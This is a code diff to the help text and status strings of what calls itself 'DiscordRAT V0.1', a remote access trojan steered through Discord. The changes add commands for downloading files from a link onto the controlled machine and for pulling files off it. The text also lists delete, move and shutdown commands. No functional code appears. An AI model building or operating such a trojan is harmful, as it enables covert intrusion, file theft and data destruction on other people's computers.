@@ -10,8 +10,8 @@ Available Commands:
 ==General==
 $help - show this message
 $chmd mode - change working mode (modes: 0 - basic, 1 - filesystem)
-$start app - start application (app - full path)
 $shutdown [time] - shutdown (time - time before shutdown in secs)
+$download link savepath - download file (link - link to file, savepath - where to save with filename)
 $exit - close session
 
 ==Command Line==
@@ -33,6 +33,7 @@ FILESYSTEM_HELP = '''
 DiscordRAT V0.1 by crazyproger1
 
 Available Commands:
+$start app - start application (app - full path)
 $rmde - reset mode to 0 (basic)
 $dir / $ls [path] - display list of the folder content (path - path to folder)
 $cd path - change working directory (path - path to folder)
@@ -41,6 +42,8 @@ $bsdir - get base working directory
 $cp src dest - copy file or directory (src - source path, dest - destination path)
 $mv src dest - move file or directory (src - source path, dest - destination path)
 $del path - delete file or directory 
+$getf path - get file (path - path to file)
+
 
 Examples:
 $rmde
@@ -57,6 +60,7 @@ DIR_CHANGED = 'Directory changed ({cwd})'
 COPIED = 'Copied'
 MOVED = 'Moved'
 REMOVED = 'Removed'
+DOWNLOADED = 'Downloaded'
 
 ERR_COMMAND = 'COMMAND ERROR: '
 ERR_ARG = 'ARGUMENT ERROR: '
